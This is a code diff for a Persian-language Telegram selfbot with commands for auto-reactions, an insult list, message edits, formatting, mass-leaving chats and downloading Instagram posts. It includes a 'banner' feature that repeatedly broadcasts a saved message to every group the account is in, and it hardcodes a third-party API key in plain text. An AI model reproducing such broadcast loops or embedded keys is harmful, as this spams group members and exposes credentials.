+        try:
+            user = await client.get_users(int(user_id))
+            user_name = f"{user.first_name or ''} {user.last_name or ''}".strip() or user.username or "بدون نام"
+            list_text += f"👤 **{user_name}**\n🆔 `{user_id}` → {reaction}\n"
+            list_text += "─" * 30 + "\n"
+        except:
+            list_text += f"👤 کاربر نامشخص\n🆔 `{user_id}` → {reaction}\n"
+            list_text += "─" * 30 + "\n"
+    
+    list_text += f"\n📊 **تعداد:** {len(auto_reactions)} ریکشن"
+    await message.edit(list_text)
+
+@app.on_message(filters.me & filters.regex(r'^پاکسازی ریکت$'))
+async def clear_reactions_command(client, message):
+    if not auto_reactions:
+        await message.edit("❌ **هیچ ریکشنی برای پاکسازی وجود ندارد**")
+        return
+    
+    reaction_count = len(auto_reactions)
+    auto_reactions.clear()
+    save_reactions()
+    
+    await message.edit(f"✅ **لیست ریکشن‌ها پاکسازی شد**\n\n🗑️ **تعداد حذف شده:** {reaction_count} ریکشن")
+
+@app.on_message(filters.me & filters.command("لیست فحش", prefixes=""))
+async def insult_list_command(client: Client, message: Message):
+    insults_list = load_insults()
+    if not insults_list:
+        return await message.edit("❌ **لیست فحش‌ها خالی است**")    
+    try:
+        loading_msg = await message.edit("🔄 **در حال دریافت لیست فحش‌ها...**")        
+        list_text = f"💢 **لیست فحش‌ها - تعداد: {len(insults_list)}**\n\n"        
+        for i, insult in enumerate(insults_list, 1):
+            list_text += f"{i}. {insult}\n"
+            if len(list_text) > 3500:
+                await loading_msg.edit(list_text)
+                list_text = f"💢 **ادامه لیست فحش‌ها**\n\n"
+                loading_msg = await message.reply("🔄 **در حال ادامه لیست...**")
+        
+        if len(list_text) > 0:
+            await loading_msg.edit(list_text)
+            
+    except Exception as e:
+        await message.edit(f"❌ **خطا در دریافت لیست فحش‌ها:**\n`{e}`")
+
+@app.on_message(filters.me & filters.command("ویرایش", prefixes="") & filters.regex(r"^ویرایش .+ به .+$"))
+async def quick_edit_command(client: Client, message: Message):
+    try:
+        if not message.reply_to_message:
+            await message.edit("❌ **لطفا روی پیامی که می‌خواهید ویرایش کنید ریپلای کنید**")
+            return
+        command_parts = message.text.split()
+        if len(command_parts) != 4:
+            await message.edit("❌ **فرمت نادرست!**\n\n**فرمت صحیح:**\n`ویرایش کلمه_قدیمی به کلمه_جدید`\n\n**مثال:**\n`ویرایش سلان به سلام`")
+            return        
+        old_word = command_parts[1]
+        separator = command_parts[2]
+        new_word = command_parts[3]
+        if separator != "به":
+            await message.edit("❌ **از کلمه 'به' به عنوان جداکننده استفاده کنید**\n\n**مثال:**\n`ویرایش سلان به سلام`")
+            return        
+        replied_message = message.reply_to_message
+        old_text = replied_message.text or replied_message.caption or ""
+        if old_word not in old_text:
+            await message.edit(f"❌ **کلمه '{old_word}' در پیام یافت نشد**")
+            return
+        new_text = old_text.replace(old_word, new_word)
+        await client.edit_message_text(
+            chat_id=replied_message.chat.id,
+            message_id=replied_message.id,
+            text=new_text
+        )
+        await message.delete()        
+    except Exception as e:
+        await message.edit(f"❌ **خطا در ویرایش:**\n`{str(e)}`")
+@app.on_message(filters.me & filters.command("تنظیم بنر", prefixes="") & filters.regex(r"^تنظیم بنر$"))
+async def set_banner_command(client: Client, message: Message):
+    global banner_counter
+    
+    try:
+        if not message.reply_to_message:
+            await message.edit("❌ **لطفا روی پیامی که می‌خواهید به عنوان بنر ثبت کنید ریپلای کنید**")
+            return
+        
+        replied_message = message.reply_to_message
+        banner_id = banner_counter
+        banner_counter += 1
+        banners[banner_id] = {
+            'message': replied_message,
+            'text': replied_message.text or replied_message.caption or "",
+            'media': replied_message.media,
+            'created_at': datetime.now()
+        }
+        
+        await message.edit(f"✅ **بنر با موفقیت ثبت شد**\n\n🆔 **کد بنر:** `{banner_id}`")
+        
+    except Exception as e:
+        await message.edit(f"❌ **خطا در ثبت بنر:**\n`{str(e)}`")
+
+@app.on_message(filters.me & filters.command("بنر همگانی", prefixes="") & filters.regex(r"^بنر همگانی \d+$"))
+async def start_broadcast_command(client: Client, message: Message):
+    try:
+        banner_id = int(message.command[1])
+        
+        if banner_id not in banners:
+            await message.edit("❌ **کد بنر یافت نشد**")
+            return
+        active_broadcasts['global'] = {
+            'banner_id': banner_id,
+            'running': True,
+            'start_time': datetime.now()
+        }
+        
+        await message.edit("✅ **بنر همگانی فعال شد**\n\n🔄 ارسال بنر به گروه‌ها و سوپرگروه‌ها شروع شد")
+        asyncio.create_task(send_global_banner(client, banner_id))
+        
+    except Exception as e:
+        await message.edit(f"❌ **خطا در فعال‌سازی بنر:**\n`{str(e)}`")
+
+@app.on_message(filters.me & filters.command("لیست بنرها", prefixes="") & filters.regex(r"^لیست بنرها$"))
+async def list_banners_command(client: Client, message: Message):
+    try:
+        if not banners:
+            await message.edit("❌ **هیچ بنری ثبت نشده است**")
+            return
+        
+        list_text = "📋 **لیست بنرها**\n\n"
+        
+        for banner_id, banner_data in banners.items():
+            created_time = banner_data['created_at'].strftime("%Y-%m-%d %H:%M")
+            preview = banner_data['text'][:50] + "..." if len(banner_data['text']) > 50 else banner_data['text']
+            
+            list_text += f"🆔 **کد:** `{banner_id}`\n"
+            list_text += f"📝 **پیش‌نمایش:** {preview}\n"
+            list_text += f"⏰ **زمان ثبت:** {created_time}\n"
+            list_text += "─" * 30 + "\n"
+        
+        await message.edit(list_text)
+        
+    except Exception as e:
+        await message.edit(f"❌ **خطا در نمایش لیست:**\n`{str(e)}`")
+
+@app.on_message(filters.me & filters.command("بنر همگانی خاموش", prefixes="") & filters.regex(r"^بنر همگانی خاموش$"))
+async def stop_broadcast_command(client: Client, message: Message):
+    try:
+        if 'global' in active_broadcasts:
+            active_broadcasts['global']['running'] = False
+            await message.edit("✅ **بنر همگانی خاموش شد**")
+        else:
+            await message.edit("❌ **بنر همگانی فعال نیست**")
+            
+    except Exception as e:
+        await message.edit(f"❌ **خطا در خاموش کردن بنر:**\n`{str(e)}`")
+
+@app.on_message(filters.me & filters.command("بنر ارسال", prefixes="") & filters.regex(r"^بنر ارسال \d+$"))
+async def instant_broadcast_command(client: Client, message: Message):
+    try:
+        banner_id = int(message.command[1]) 
+        
+        if banner_id not in banners:
+            await message.edit("❌ **کد بنر یافت نشد**")
+            return
+        
+        await message.edit("🔄 **شروع ارسال فوری بنر...**")
+        asyncio.create_task(send_instant_broadcast(client, banner_id))
+        
+    except Exception as e:
+        await message.edit(f"❌ **خطا در ارسال بنر:**\n`{str(e)}`")
+
+@app.on_message(filters.me & filters.command("زمان بنر", prefixes="") & filters.regex(r"^زمان بنر \d+$"))
+async def set_banner_time_command(client: Client, message: Message):
+    try:
+        minutes = int(message.command[1]) 
+        active_broadcasts['delay'] = minutes * 60 
+        
+        await message.edit(f"✅ **زمان بنر تنظیم شد:** {minutes} دقیقه")
+        
+    except Exception as e:
+        await message.edit(f"❌ **خطا در تنظیم زمان:**\n`{str(e)}`")
+
+@app.on_message(filters.me & filters.command("فرمت", prefixes=""))
+async def format_command(client, message):
+    html_tags = {
+        "بولد": "<b>{}</b>",
+        "ایتالیک": "<i>{}</i>",
+        "زیر خط": "<u>{}</u>",
+        "خط‌ خورده": "<s>{}</s>",
+        "اسپویلر": "<spoiler>{}</spoiler>",
+        "کد": "<code>{}</code>",
+        "پیش‌ فرمت": "<pre>{}</pre>",
+        "نقل‌ قول": "<blockquote>{}</blockquote>",
+    }
+    
+    if len(message.command) < 2:
+        status_text = "🎨 <b>وضعیت فرمت‌ها</b>\n\n"
+        
+        for format_name, is_active in format_settings.items():
+            emoji = "🟢" if is_active else "🔴"
+            status_text += f"{emoji} <b>{format_name}</b>: {'فعال' if is_active else 'غیرفعال'}\n"
+        
+        status_text += f"\n📊 <b>فرمت‌های فعال:</b> {sum(format_settings.values())} از {len(format_settings)}"
+        
+        await message.edit(f"""
+{status_text}
+
+📝 <b>دستورات فرمت:</b>
+<code>فرمت بولد روشن</code>
+<code>فرمت بولد خاموش</code>
+<code>فرمت ایتالیک روشن</code>
+<code>فرمت ایتالیک خاموش</code>
+<code>فرمت زیر خط روشن</code>
+<code>فرمت زیر خط خاموش</code>
+<code>فرمت خط‌ خورده روشن</code>
+<code>فرمت خط‌ خورده خاموش</code>
+<code>فرمت اسپویلر روشن</code>
+<code>فرمت اسپویلر خاموش</code>
+<code>فرمت کد روشن</code>
+<code>فرمت کد خاموش</code>
+<code>فرمت پیش‌ فرمت روشن</code>
+<code>فرمت پیش‌ فرمت خاموش</code>
+<code>فرمت نقل‌ قول روشن</code>
+<code>فرمت نقل‌ قول خاموش</code>
+
+🔧 <b>سایر دستورات:</b>
+<code>فرمت وضعیت</code> - نمایش وضعیت
+<code>فرمت ریست</code> - غیرفعال کردن همه
+""", parse_mode=enums.ParseMode.HTML)
+        return
+    if len(message.command) == 2:
+        sub_command = message.command[1]        
+        if sub_command == "وضعیت":
+            status_text = "🎨 <b>وضعیت فرمت‌ها</b>\n\n"
+            
+            for format_name, is_active in format_settings.items():
+                emoji = "🟢" if is_active else "🔴"
+                status_text += f"{emoji} <b>{format_name}</b>: {'فعال' if is_active else 'غیرفعال'}\n"
+            
+            status_text += f"\n📊 <b>فرمت‌های فعال:</b> {sum(format_settings.values())} از {len(format_settings)}"
+            await message.edit(status_text, parse_mode=enums.ParseMode.HTML)
+            return            
+        elif sub_command == "ریست":
+            for format_name in format_settings:
+                format_settings[format_name] = False
+            await message.edit("✅ <b>همه فرمت‌ها غیرفعال شدند</b>", parse_mode=enums.ParseMode.HTML)
+            return
+    if len(message.command) == 3:
+        format_name = message.command[1]
+        action = message.command[2]        
+        if format_name in format_settings:
+            if action == "روشن":
+                format_settings[format_name] = True
+                sample_text = html_tags[format_name].format("این یک متن نمونه است")
+                await message.edit(f"✅ <b>فرمت {format_name} فعال شد</b>\n\n📝 <b>نمونه:</b> {sample_text}", parse_mode=enums.ParseMode.HTML)                
+            elif action == "خاموش":
+                format_settings[format_name] = False
+                await message.edit(f"✅ <b>فرمت {format_name} غیرفعال شد</b>", parse_mode=enums.ParseMode.HTML)                
+            else:
+                await message.edit("❌ <b>دستور نامعتبر</b>\n\n💡 از <code>روشن</code> یا <code>خاموش</code> استفاده کنید", parse_mode=enums.ParseMode.HTML)
+        else:
+            await message.edit(f"❌ <b>فرمت نامعتبر</b>\n\n💡 فرمت‌های معتبر: {', '.join(format_settings.keys())}", parse_mode=enums.ParseMode.HTML)
+    else:
+        await message.edit("❌ <b>فرمت دستور نادرست</b>\n\n💡 از <code>فرمت</code> برای مشاهده راهنما استفاده کنید", parse_mode=enums.ParseMode.HTML)
+
+@app.on_message(filters.me & filters.command("تعداد کانال ها", prefixes=""))
+async def channels_count_command(client: Client, message: Message):
+    """نمایش تعداد دقیق کانال‌ها"""
+    try:
+        loading_msg = await message.edit("**📊 در حال شمارش کانال‌ها...**")
+        
+        channels_count = 0
+        channels_list = []
+        
+        async for dialog in client.get_dialogs():
+            if dialog.chat.type == enums.ChatType.CHANNEL:
+                channels_count += 1
+                channels_list.append(dialog.chat.title)
+        
+        result_text = f"""**📈 آمار کانال‌ها**
+
+📊 **تعداد کل کانال‌ها:** `{channels_count}`
+        
+📋 **لیست کانال‌ها:**
+"""
+        for i, channel in enumerate(channels_list[:20], 1):
+            result_text += f"{i}. {channel}\n"
+        
+        if len(channels_list) > 20:
+            result_text += f"\n📝 و {len(channels_list) - 20} کانال دیگر..."
+        
+        await loading_msg.edit(result_text)
+        
+    except Exception as e:
+        await message.edit(f"**❌ خطا در دریافت اطلاعات:**\n`{str(e)}`")
+
+@app.on_message(filters.me & filters.command("تعداد گروه ها", prefixes=""))
+async def groups_count_command(client: Client, message: Message):
+    """نمایش تعداد دقیق گروه‌ها"""
+    try:
+        loading_msg = await message.edit("**📊 در حال شمارش گروه‌ها...**")
+        
+        groups_count = 0
+        supergroups_count = 0
+        groups_list = []
+        
+        async for dialog in client.get_dialogs():
+            if dialog.chat.type == enums.ChatType.GROUP:
+                groups_count += 1
+                groups_list.append(f"?? {dialog.chat.title}")
+            elif dialog.chat.type == enums.ChatType.SUPERGROUP:
+                supergroups_count += 1
+                groups_list.append(f"👑 {dialog.chat.title}")
+        
+        total_groups = groups_count + supergroups_count
+        
+        result_text = f"""**📈 آمار گروه‌ها**
+
+📊 **تعداد کل گروه‌ها:** `{total_groups}`
+• گروه‌های معمولی: `{groups_count}`
+• سوپرگروه‌ها: `{supergroups_count}`
+
+📋 **لیست گروه‌ها:**
+"""
+        for i, group in enumerate(groups_list[:20], 1):
+            result_text += f"{i}. {group}\n"
+        
+        if len(groups_list) > 20:
+            result_text += f"\n📝 و {len(groups_list) - 20} گروه دیگر..."
+        
+        await loading_msg.edit(result_text)
+        
+    except Exception as e:
+        await message.edit(f"**❌ خطا در دریافت اطلاعات:**\n`{str(e)}`")
+
+@app.on_message(filters.me & filters.command("خروج همه کانال", prefixes=""))
+async def leave_all_channels_command(client: Client, message: Message):
+    """خروج از تمام کانال‌ها با تاخیر"""
+    try:
+        loading_msg = await message.edit("**🔄 در حال دریافت لیست کانال‌ها...**")
+        
+        channels = []
+        
+        async for dialog in client.get_dialogs():
+            if dialog.chat.type == enums.ChatType.CHANNEL:
+                channels.append(dialog.chat)
+        
+        if not channels:
+            return await loading_msg.edit("**❌ هیچ کانالی برای خروج پیدا نشد**")
+        
+        await loading_msg.edit(f"**🚪 در حال خروج از {len(channels)} کانال...**")
+        
+        success_count = 0
+        failed_count = 0
+        
+        for i, channel in enumerate(channels, 1):
+            try:
+                await client.leave_chat(channel.id)
+                success_count += 1
+                await asyncio.sleep(4)
+                
+                if i % 5 == 0:
+                    await loading_msg.edit(f"**🚪 در حال خروج...**\n\n✅ **موفق:** {success_count}\n❌ **ناموفق:** {failed_count}\n📊 **پیشرفت:** {i}/{len(channels)}")
+                    
+            except Exception as e:
+                failed_count += 1
+                print(f"خطا در خروج از {channel.title}: {e}")
+        
+        await loading_msg.edit(f"""**✅ عملیات خروج کامل شد**
+
+📊 **نتایج:**
+• ✅ موفق: `{success_count}`
+• ❌ ناموفق: `{failed_count}`
+• 📊 کل کانال‌ها: `{len(channels)}`""")
+        
+    except Exception as e:
+        await message.edit(f"**❌ خطا:**\n`{str(e)}`")
+
+@app.on_message(filters.me & filters.command("خروج همه گروه", prefixes=""))
+async def leave_all_groups_command(client: Client, message: Message):
+    """خروج از تمام گروه‌ها با تاخیر"""
+    try:
+        loading_msg = await message.edit("**🔄 در حال دریافت لیست گروه‌ها...**")
+        
+        groups = []
+        
+        async for dialog in client.get_dialogs():
+            if dialog.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
+                groups.append(dialog.chat)
+        
+        if not groups:
+            return await loading_msg.edit("**❌ هیچ گروهی برای خروج پیدا نشد**")
+        
+        await loading_msg.edit(f"**🚪 در حال خروج از {len(groups)} گروه...**")
+        
+        success_count = 0
+        failed_count = 0
+        
+        for i, group in enumerate(groups, 1):
+            try:
+                await client.leave_chat(group.id)
+                success_count += 1
+                await asyncio.sleep(4)
+                
+                if i % 3 == 0:
+                    await loading_msg.edit(f"**🚪 در حال خروج...**\n\n✅ **موفق:** {success_count}\n❌ **ناموفق:** {failed_count}\n📊 **پیشرفت:** {i}/{len(groups)}")
+                    
+            except Exception as e:
+                failed_count += 1
+                print(f"خطا در خروج از {group.title}: {e}")
+        
+        await loading_msg.edit(f"""**✅ عملیات خروج کامل شد**
+
+📊 **نتایج:**
+• ✅ موفق: `{success_count}`
+• ❌ ناموفق: `{failed_count}`
+• 📊 کل گروه‌ها: `{len(groups)}`""")
+        
+    except Exception as e:
+        await message.edit(f"**❌ خطا:**\n`{str(e)}`")
+
+@app.on_message(filters.me & filters.command("اکشن", prefixes=""))
+async def action_command(client: Client, message: Message):
+    if len(message.command) == 1:
+        active_actions = [name for name, status in action_settings.items() if status]
+        
+        actions_text = """🎭 <b>سیستم اکشن خودکار</b>
+📊 <b>وضعیت فعلی:</b>
+"""
+        if active_actions:
+            actions_text += f"✅ <b>فعال:</b> {', '.join([get_persian_action_name(name) for name in active_actions])}\n"
+        else:
+            actions_text += "❌ <b>هیچ اکشنی فعال نیست</b>\n"
+        
+        actions_text += """
+🔧 <b>دستورات:</b>
+<code>اکشن لیست</code> - نمایش لیست کامل اکشن‌ها
+<code>اکشن [نام] روشن</code> - فعال کردن اکشن
+<code>اکشن [نام] خاموش</code> - غیرفعال کردن اکشن
+<code>اکشن وضعیت</code> - نمایش وضعیت دقیق
+<code>اکشن ریست</code> - خاموش کردن همه اکشن‌ها
+
+📝 <b>مثال:</b>
+<code>اکشن تایپ روشن</code>
+<code>اکشن اپلود فایل خاموش</code>
+<code>اکشن وضعیت</code>
+"""
+        await message.edit(actions_text, parse_mode=enums.ParseMode.HTML)
+        return
+    
+    sub_command = message.command[1]
+    
+    if sub_command == "لیست":
+        actions_list = """🎭 <b>لیست کامل اکشن‌های تلگرام</b>
+
+📝 <b>اکشن‌های متنی (نمایش به کاربر):</b>
+• تایپ - ⌨️ در حال تایپ (Typing...)
+• اپلود عکس - 📸 در حال آپلود عکس (Uploading photo...)
+• ضبط ویس - 🎤 در حال ضبط ویس (Recording voice...)
+• اپلود ویدیو - 🎥 در حال آپلود ویدیو (Uploading video...)
+• اپلود فایل - 📄 در حال آپلود فایل (Uploading document...)
+• ضبط ویدیو - 🎬 در حال ضبط ویدیو (Recording video...)
+• اپلود ویس - 🎵 در حال آپلود ویس (Uploading voice...)
+• اپلود ویدیو نوت - 📹 در حال آپلود ویدیو نوت (Uploading video note...)
+• ضبط ویدیو نوت - 🎞️ در حال ضبط ویدیو نوت (Recording video note...)
+• بازی - 🎮 در حال بازی (Playing...)
+• انتخاب مخاطب - 👤 در حال انتخاب مخاطب (Choosing contact...)
+• پیدا کردن موقعیت - 📍 در حال پیدا کردن موقعیت (Finding location...)
+• انتخاب استیکر - 🎨 در حال انتخاب استیکر (Choosing sticker...)
+
+💡 <b>نکته:</b>
+وقتی کاربر پیام می‌فرستد، اکشن فعال نمایش داده می‌شود
+اکشن‌ها در پیوی و گروه کار می‌کنند"""
+        await message.edit(actions_list, parse_mode=enums.ParseMode.HTML)
+    
+    elif sub_command == "وضعیت":
+        status_text = "📊 <b>وضعیت دقیق اکشن‌ها</b>\n\n"
+        
+        for action_name, is_active in action_settings.items():
+            emoji = "🟢" if is_active else "🔴"
+            persian_name = get_persian_action_name(action_name)
+            status_text += f"{emoji} <b>{persian_name}</b>: {'فعال ✅' if is_active else 'غیرفعال ❌'}\n"
+        
+        active_count = sum(action_settings.values())
+        status_text += f"\n📈 <b>آمار:</b> {active_count} از {len(action_settings)} اکشن فعال"
+        
+        await message.edit(status_text, parse_mode=enums.ParseMode.HTML)
+    
+    elif sub_command == "ریست":
+        for key in action_settings:
+            action_settings[key] = False
+        
+        await message.edit("✅ <b>همه اکشن‌ها خاموش شدند</b>", parse_mode=enums.ParseMode.HTML)    
+    else:
+        full_text = ' '.join(message.command[1:])
+        if " روشن" in full_text:
+            action_name_persian = full_text.replace(" روشن", "").strip()
+            action_state = "روشن"
+        elif " خاموش" in full_text:
+            action_name_persian = full_text.replace(" خاموش", "").strip()
+            action_state = "خاموش"
+        else:
+            await message.edit("❌ <b>فرمت دستور نادرست است</b>\n\nمثال: <code>اکشن اپلود عکس روشن</code>", parse_mode=enums.ParseMode.HTML)
+            return
+        action_name = get_english_action_name(action_name_persian)        
+        if action_name not in action_settings:
+            await message.edit(f"❌ <b>اکشن '{action_name_persian}' یافت نشد</b>\n\n📝 از دستور <code>اکشن لیست</code> استفاده کنید", parse_mode=enums.ParseMode.HTML)
+            return
+        
+        if action_state == "روشن":
+            action_settings[action_name] = True
+            persian_name = get_persian_action_name(action_name)
+            await message.edit(f"✅ <b>اکشن '{persian_name}' فعال شد</b>\n\nاز این به بعد وقتی کاربران پیام می‌فرستند، اکشن '{persian_name}' نمایش داده می‌شود.", parse_mode=enums.ParseMode.HTML)
+        
+        elif action_state == "خاموش":
+            action_settings[action_name] = False
+            persian_name = get_persian_action_name(action_name)
+            await message.edit(f"✅ <b>اکشن '{persian_name}' غیرفعال شد</b>", parse_mode=enums.ParseMode.HTML)
+
+@app.on_message(filters.me & filters.command("اینستا", prefixes=""))
+async def instagram_download_command(client: Client, message: Message):
+    """دانلود پست‌های اینستاگرام (ریل و پست عادی)"""
+    try:
+        if len(message.command) < 2:
+            await message.edit("""
+📥 **دستور دانلود اینستاگرام**
+
+📝 **استفاده:**
+`اینستا [لینک پست یا ریل]`
+
+📌 **مثال‌ها:**
+
+`اینستا https://www.instagram.com/reel/DOkym3fCFqg/`
+
+`اینستا https://www.instagram.com/p/CzuF4KQqJ7q/`
+
+""")
+            return        
+        url = message.command[1].strip()
+        if not url.startswith(("https://www.instagram.com/", "https://instagram.com/")):
+            await message.edit("❌ **لینک نامعتبر!**\nلطفا لینک معتبر اینستاگرام وارد کنید.")
+            return
+        if "/stories/" in url or "/story/" in url:
+            await message.edit("❌ **این دستور فقط برای پست‌ها و ریل‌ها کار می‌کند!**\nلینک استوری پشتیبانی نمی‌شود.")
+            return        
+        loading_msg = await message.edit("🔄 **در حال دریافت اطلاعات از اینستاگرام...**")
+        api_key = "8000978149:uJC3mxBncq9ELPN@Api_ManagerRoBot"
+        api_url = f"https://api.fast-creat.ir/instagram?apikey={api_key}&type=post&url={url}"        
+        try:
+            headers = {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            }
+            import urllib.parse
+            encoded_url = urllib.parse.quote(url, safe='')
+            final_api_url = f"https://api.fast-creat.ir/instagram?apikey={api_key}&type=post&url={encoded_url}"            
+            response = requests.get(final_api_url, headers=headers, timeout=45)
+            print(f"Status Code: {response.status_code}")
+            print(f"Response: {response.text[:500]}")
+            if response.status_code != 200:
+                await loading_msg.edit(f"❌ **خطا در اتصال به سرور**\nکد خطا: {response.status_code}")
+                return
+            try:
+                data = response.json()
+            except json.JSONDecodeError as e:
+                await loading_msg.edit(f"❌ **پاسخ JSON نامعتبر**\n{str(e)}")
+                return
+            if not data.get("ok", False):
+                error_msg = data.get("status", "خطای نامشخص")
+                await loading_msg.edit(f"❌ **خطا از سمت API**\n{error_msg}")
+                return
+            if "result" not in data:
+                await loading_msg.edit("❌ **پاسخ نامعتبر از سرور**\nفیلد 'result' یافت نشد")
+                return
+            
+            result = data.get("result", {})
+            
+            if result.get("status") != "success":
+                error_detail = result.get("message", "پست یافت نشد")
+                await loading_msg.edit(f"❌ **خطا:** {error_detail}")
+                return
+            posts = result.get("result", [])
+            
+            if not posts:
+                await loading_msg.edit("❌ **هیچ محتوایی در این پست یافت نشد**")
+                return
+            post = posts[0]
+            post_id = post.get('id', 'نامشخص')
+            username = post.get('username', 'نامشخص')
+            caption = post.get('caption', 'بدون توضیح')
+            is_video = post.get('is_video', False)
+            thumbnail_url = post.get('video_img', '')
+            caption_text = f"""
+📸 **اینستاگرام دانلودر**
+
+👤 **صاحب پست:** @{username}
+🆔 **آیدی پست:** `{post_id}`
+
+📝 **توضیحات:**
+{caption[:500]}{'...' if len(caption) > 500 else ''}
+
+#دانلود_اینستاگرام
+"""
+            thumbnail_path = None
+            if thumbnail_url:
+                try:
+                    thumb_response = requests.get(thumbnail_url, timeout=15)
+                    if thumb_response.status_code == 200:
+                        thumbnail_path = f"temp_thumb_{post_id}.jpg"
+                        with open(thumbnail_path, 'wb') as f:
+                            f.write(thumb_response.content)
+                except:
+                    thumbnail_path = None
+            if is_video:
+                video_url = post.get('video_url')
+                
+                if not video_url:
+                    await loading_msg.edit("❌ **لینک ویدیو یافت نشد**")
+                    if thumbnail_path and os.path.exists(thumbnail_path):
+                        os.remove(thumbnail_path)
+                    return                
+                await loading_msg.edit("🎥 **در حال دانلود ویدیو...**")                
+                try:
+                    video_response = requests.get(video_url, timeout=60)
+                    
+                    if video_response.status_code != 200:
+                        await loading_msg.edit("❌ **خطا در دانلود ویدیو**")
+                        if thumbnail_path and os.path.exists(thumbnail_path):
+                            os.remove(thumbnail_path)
+                        return
+                    temp_file = f"temp_insta_{post_id}.mp4"
+                    with open(temp_file, 'wb') as f:
+                        f.write(video_response.content)
+                    file_size = os.path.getsize(temp_file)
+                    if file_size == 0:
+                        await loading_msg.edit("❌ **فایل ویدیو خالی است**")
+                        os.remove(temp_file)
+                        if thumbnail_path and os.path.exists(thumbnail_path):
+                            os.remove(thumbnail_path)
+                        return                    
+                    await loading_msg.edit("📤 **در حال آپلود ویدیو...**")                    
+                    try:
+                        await client.send_video(
+                            chat_id=message.chat.id,
+                            video=temp_file,
+                            caption=caption_text,
+                            thumb=thumbnail_path if thumbnail_path else None,
+                            supports_streaming=True,
+                            reply_to_message_id=message.id
+                        )
+                    except Exception as upload_error:
+                        await loading_msg.edit(f"❌ **خطا در آپلود:**\n`{str(upload_error)[:100]}`")
+                    if os.path.exists(temp_file):
+                        os.remove(temp_file)
+                    if thumbnail_path and os.path.exists(thumbnail_path):
+                        os.remove(thumbnail_path)
+                    
+                    await loading_msg.delete()
+                    
+                except Exception as e:
+                    await loading_msg.edit(f"❌ **خطا در پردازش ویدیو:**\n`{str(e)[:100]}`")
+                    for temp_file in [f"temp_insta_{post_id}.mp4", f"temp_thumb_{post_id}.jpg"]:
+                        if os.path.exists(temp_file):
+                            os.remove(temp_file)
+            else:
+                media_url = thumbnail_url
+                
+                if not media_url:
+                    await loading_msg.edit("❌ **لینک عکس یافت نشد**")
+                    return                
+                await loading_msg.edit("🖼️ **در حال دانلود عکس...**")                
+                try:
+                    image_response = requests.get(media_url, timeout=30)
+                    
+                    if image_response.status_code != 200:
+                        await loading_msg.edit("❌ **خطا در دانلود عکس**")
+                        return
+                    temp_file = f"temp_insta_{post_id}.jpg"
+                    with open(temp_file, 'wb') as f:
+                        f.write(image_response.content)                    
+                    await loading_msg.edit("📤 **در حال آپلود عکس...**")                    
+                    try:
+                        await client.send_photo(
+                            chat_id=message.chat.id,
+                            photo=temp_file,
+                            caption=caption_text,
+                            reply_to_message_id=message.id
+                        )
+                    except Exception as upload_error:
+                        await loading_msg.edit(f"❌ **خطا در آپلود عکس:**\n`{str(upload_error)[:100]}`")
+                    if os.path.exists(temp_file):
+                        os.remove(temp_file)                    
+                    await loading_msg.delete()                    
+                except Exception as e:
+                    await loading_msg.edit(f"❌ **خطا در پردازش عکس:**\n`{str(e)[:100]}`")
+                    if os.path.exists(f"temp_insta_{post_id}.jpg"):
+                        os.remove(f"temp_insta_{post_id}.jpg")                    
+        except requests.exceptions.Timeout:
+            await loading_msg.edit("❌ **اتصال timeout شد**\nسرور پاسخ نداد.")
+        except requests.exceptions.ConnectionError:
+            await loading_msg.edit("❌ **خطا در اتصال**\nاینترنت خود را بررسی کنید.")
+        except Exception as e:
+            await loading_msg.edit(f"❌ **خطای غیرمنتظره:**\n`{str(e)[:150]}`")
+            
+    except Exception as e:
+        await message.edit(f"❌ **خطای کلی:**\n`{str(e)[:150]}`")
+
+@app.on_message(filters.me & filters.command("پینگ", prefixes=""))
+async def ping_command(client: Client, message: Message):
+    """بررسی سرعت ربات"""
+    start_time = datetime.now()
+    ping_msg = await message.edit("**⏳ در حال بررسی...**")
+    end_time = datetime.now()
+    
+    ping_time = (end_time - start_time).microseconds / 1000
+    await ping_msg.edit(f"**🏓 پونگ!**\n**⏱ سرعت: {ping_time:.2f} ms**")
+@app.on_message(filters.me & filters.command(["پنل", "panel"], prefixes=""))
+async def panel_command(client, message: Message):
+        results = await client.get_inline_bot_results(bot_username, "panel")
+        
+        if results and results.results:
+            sent_message = await client.send_inline_bot_result(
+                chat_id=message.chat.id,
+                query_id=results.query_id,
+                result_id=results.results[0].id
+            )
+            await message.delete()
+            
+        else:
+            await message.reply_text("❌ پنل یافت نشد")
+            await asyncio.sleep(3)
+            await message.delete()
+@app.on_message(filters.me & filters.regex(r'^حذف ریکت$'))
+async def remove_reaction_command(client, message):
+    if message.reply_to_message and message.reply_to_message.from_user:
+        user_id = message.reply_to_message.from_user.id
+        user_name = f"{message.reply_to_message.from_user.first_name or ''} {message.reply_to_message.from_user.last_name or ''}".strip() or "کاربر"
+        
+        if str(user_id) in auto_reactions:
+            del auto_reactions[str(user_id)]
+            save_reactions()
+            await message.edit(f"✅ **ریکشن حذف شد**\n\n👤 کاربر: {user_name}\n🆔 آیدی: `{user_id}`")
+        else:
+            await message.edit(f"❌ **ریکشنی برای این کاربر ثبت نشده**")
+    else:
+        await message.edit("❌ **لطفاً روی پیام کاربر ریپلای کنید**")
 
 if __name__ == "__main__":
-    main()
+    if USER_ID:
+        print(f"✅ سلف‌بات برای کاربر {USER_ID} در حال اجرا...")
+        print(f"📱 شماره: {PHONE}")
+    else:
+        print("⚠️ سلف‌بات در حالت معمولی اجرا شد")
+    app.run()
